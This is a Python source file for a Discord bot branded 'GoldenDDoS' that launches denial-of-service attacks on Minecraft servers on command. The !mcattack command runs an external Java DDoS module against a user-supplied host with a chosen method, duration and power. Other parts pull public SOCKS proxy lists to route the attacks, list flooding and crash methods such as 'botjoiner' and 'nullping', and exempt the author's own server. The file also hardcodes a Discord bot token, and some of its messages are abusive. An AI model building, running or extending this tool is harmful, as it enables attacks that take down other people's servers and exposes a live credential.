from cgitb import handler, text
from concurrent.futures import thread
from contextlib import nullcontext
from unicodedata import name
from urllib.parse import urljoin, urlparse
import discord
from discord.ext import commands
import os
import threading
import socket
import discord.utils
import requests
import urllib
import json
import asyncio
import random
import sqlite3
import psutil
import mcstatus
import getpass
import datetime
from mcstatus import MinecraftServer
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
from gtts import gTTS
from subprocess import Popen, TimeoutExpired, run
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands



token = "OTU5OTQyMTY1MTY4MDIxNTM0.GwcO4U.m5dTimTUx_ajgP8dUf2ABOXS_CQvH9s5guVq00"
methods_list = ['join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 'query', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher,' 'tcphit,' 'queue,' 'botnet,' 'tcpbypass,' 'ultimatesmasher,' 'sf,' 'nabcry,' 'rip' ] # methods in mcstorm
channel_id = 986669905929699329
protocols_list = ['759', '758', '757', '756', '755', '754', '753', '751', '736', '735', '578', '575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338 ', '335', '316', '210', '110', '109', '107', '47' ]
blocked_servers = ["GoldenTop2011.aternos.me:18744", "GoldenTop2011.aternos.me", "GoldenTop2011.tk"]
blocked_cps = ["-1"]

client = commands.Bot(command_prefix='!')
client.remove_command('help')

@client.event
async def on_ready():
  while True:
    await client.change_presence(activity=discord.Game(name="GoldenDDoS | Prefix: !"))
    await asyncio.sleep(5.0)


@client.command()
async def botstats(ctx):
    embed = discord.Embed(
      title = '**📊SYSTEM RESOURCE USAGE📊**', 
      description = 'System resource usage of server or bot.'
    )
    embed.add_field(name = '**🥏[CPU]**', value = f'{psutil.cpu_percent()}% OF {psutil.cpu_count()} CORES', inline = True)
    embed.add_field(name = '**📈[RAM]**', value = f'{psutil.virtual_memory().used}КB / {psutil.virtual_memory().total}КB', inline=True)
    embed.add_field(name = '**📉[RAM AVAILABLE]**', value = f'{psutil.virtual_memory().free}КB / {psutil.virtual_memory().total}КB', inline = True)
    await ctx.send(embed=embed)

@client.command()
async def mcattackstop(ctx):
    os.system("taskkill /im java.exe /f")
    embed = discord.Embed(
        title='⚠Все атаки завершены',
        description=f'{ctx.author.mention} пидарас стопнул всё',
        color=discord.Colour.random()
    )

    await ctx.send(embed=embed)

@client.command()
async def updateproxy(ctx):
    def update():
        Socks4URL = "https://api.openproxylist.xyz/socks4.txt"
        Socks5URL = "https://api.openproxylist.xyz/socks5.txt"
        path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'proxies.txt')
        if os.path.exists(path):
          os.system("rem proxies.txt")
        r = requests.get(Socks4URL, allow_redirects=True)
        open('proxies.txt', 'wb').write(r.content)
        r2 = requests.get(Socks5URL, allow_redirects=True)
        open('proxies.txt', 'wb').write(r2.content)
    threading.Thread(target=update).start()
    
    EmbedUpdate = discord.Embed(
      title='💦Прокси успешно обновлено',
      description='Типы прокси: Socks4, Socks5',
      color=discord.Colour.random()
    )
    await ctx.send(embed=EmbedUpdate)

#Помощь
@client.command()
async def help(ctx):
  EmbedHelp = discord.Embed(
    title = '**>> 💭HELP💭 <<**',
    color = discord.Colour.random()
  )

  EmbedHelp.add_field(
    name='!mcattack <IP:PORT> <PROTOCOL (VERSION)> <METHOD> <TIME IN SECONDS> <CPS (POWER)>',
    value='**👹[ATTACK THE MINECRAFT SERVER]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattackstop',
    value='**😡[STOP ALL MINECRAFT SERVER ATTACKS]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcresolve <IP:PORT>',
    value='**🤓[RESOLVE INFORMATION ABOUT MINECRAFT SERVER]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!updateproxy',
    value='**💦[UPDATE PROXY]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!botstats',
    value='**📈[SYSTEM RESOURCE USAGE STATS]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcprotocols',
    value='**🎫[PROTOCOLS OF MINECRAFT VERSIONS]**',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattackmethods',
    value='**🧨[MINECRAFT SERVER ATTACK METHODS]**',
    inline=True
  )
  await ctx.send(embed=EmbedHelp)

#Протоколы
@client.command()
async def protocols(ctx):
    embed = discord.Embed(
        title="**>> 🎫PROTOCOLS🎫 <<**",
        description='This is all protocols of minecraft versions.',
        color=discord.Colour.blue()
    )
    embed.add_field(name='**1.18.2**', value='758', inline=True)
    embed.add_field(name='**1.18.1**', value='757', inline=True)
    embed.add_field(name='**1.18**', value='757', inline=True)
    embed.add_field(name='**1.17.1**', value='756', inline=True)
    embed.add_field(name='**1.16.5**', value='754', inline=True)
    embed.add_field(name='**1.16.3**', value='753', inline=True)
    embed.add_field(name='**1.16.2**', value='751', inline=True)
    embed.add_field(name='**1.16.1**', value='736', inline=True)
    embed.add_field(name='**1.16**', value='735', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15.2**', value='578', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15**', value='573', inline=True)
    embed.add_field(name='**1.14.4**', value='498', inline=True)
    embed.add_field(name='**1.14.3**', value='490', inline=True)
    embed.add_field(name='**1.14.2**', value='485', inline=True)
    embed.add_field(name='**1.14.1**', value='480', inline=True)
    embed.add_field(name='**1.14**', value='477', inline=True)
    embed.add_field(name='**1.13.2**', value='404', inline=True)
    embed.add_field(name='**1.13.1**', value='401', inline=True)
    embed.add_field(name='**1.13**', value='393', inline=True)
    embed.add_field(name='**1.12.2**', value='340', inline=True)
    embed.set_footer(text="GoldenDDoS")
    await ctx.send(embed=embed)


#Методы
@client.command()
async def mcattackmethods(ctx):
    embed = discord.Embed(
        title="**>> 📁ALL METHODS📁 <<**",
    color=discord.Colour.random()
    )
    embed.add_field(name='📂 :', value=', '.join([i for i in methods_list]), inline=True)
    embed.set_footer(text="its all methods")
    await ctx.send(embed=embed)

#Узнание информации
@client.command()
async def mcresolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    e = discord.Embed(
        title="**>>  ✅👾RESOLVED✅👾  <<**",
        description=f'👨‍💻🥵😈Successfully resolved information about {arg1}🤯🥵',
        color=discord.Colour.random()
    )

    e.add_field(name='**[💥HOSTNAME]:**', value=json_object["hostname"], inline=True)
    e.add_field(name='**[🔥IP]:**', value=json_object["ip"], inline=True)
    e.add_field(name='**[💦PORT]:**', value=json_object["port"], inline=True)
    e.add_field(name='**[✅ONLINE]:**', value=json_object["online"], inline=True)
    g = json_object["ip"]
    gb = json_object["port"]
    e.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
    e.set_footer(text="GoldenDDoS")
    await ctx.send(embed=e)


@client.command()
@commands.cooldown(60, 60, commands.BucketType.user)
async def mcattack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack1():
      os.system(
          f"java -jar MinecraftServerDDoSModule.jar {arg1} {arg2} {arg3} {arg4} {arg5}"
      )

    embed = discord.Embed(
        title='**✅🚀 ATTACK SENT SUCCESSFULLY 🚀✅**',
        description=f'🥵🤡ATTACK SENT BY {ctx.author.mention} 🥵🥵🤬:wink:',
        color=discord.Colour.random()
    )

    embed.add_field(name='**🎪[HOST]:**', value=f'{arg1}', inline=True)
    embed.add_field(name='**🎫[PROTOCOL]:**', value=f'{arg2}', inline=True)
    embed.add_field(name='**🧨[METHOD]:**', value=f'{arg3}', inline=True)
    embed.add_field(name='**⏱[TIME]:**', value=f'{arg4}', inline=True)
    embed.add_field(name='**💪[CPS]:**', value=f'{arg5}', inline=True) 
    embed.set_image(url=f'https://media2.giphy.com/media/V4NSR1NG2p0KeJJyr5/200.gif')
    embed.set_footer(text="🧡💛GOLDENDDOS By Wawastera Corporation💛🧡")

    #снизу проверка на жив ли сервер)
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color = discord.Color.red())
        emb.add_field(name = '❌ **[ERROR]**', value = '**🚫 Сервер выключен либо его не существует.**')
        await ctx.send(embed=emb)
        return

    if str(arg2) not in protocols_list:
        em = discord.Embed(title=f"❌ **[ERROR]**.", description=f"**👿Недостаточно аргументов: Протокол не найти. Все протоколы > !protocols**", color=ctx.author.color)
        await ctx.send(embed=em)
        return


    if arg3 not in methods_list:
        em = discord.Embed(title=f"❌ **[ERROR]**.", description=f"**👺Недостаточно аргументов Методы не найти. - !methods**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"❌ **[ERROR]**.", description=f"**😶‍🌫️ Этот чат недействителен.**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    if str(arg1) in blocked_servers:
      em = discord.Embed(
        title='**❌ [ERROR]**',
        description='🤬Fuck you, you cant destroy our server!!!',
        color = discord.Colour.random()
      )
      await ctx.send(embed=em)
      return

    if int(arg4) > 120:
      em = discord.Embed(
        title='**❌ [ERROR]**',
        description=f"Вы не можете ставить время больше 120",
        color=discord.Colour.random()
      )
      await ctx.send(embed=em)
      return
    
    if int(arg5) > 10000:
      em = discord.Embed(
        title='**❌ [ERROR]**',
        description=f"Вы не можете ставить силу больше 10000",
        color=discord.Colour.random()
      )
      await ctx.send(embed=em)
      return
    
    if str(arg5) in blocked_cps:
      em = discord.Embed(
        title='**❌ [ERROR]**',
        description=f"Вы не можете ставить силу больше 10000",
        color=discord.Colour.random()
      )
      await ctx.send(embed=em)
      return

    threading.Thread(target=attack1).start()

    await ctx.send(embed=embed) 


client.run(token)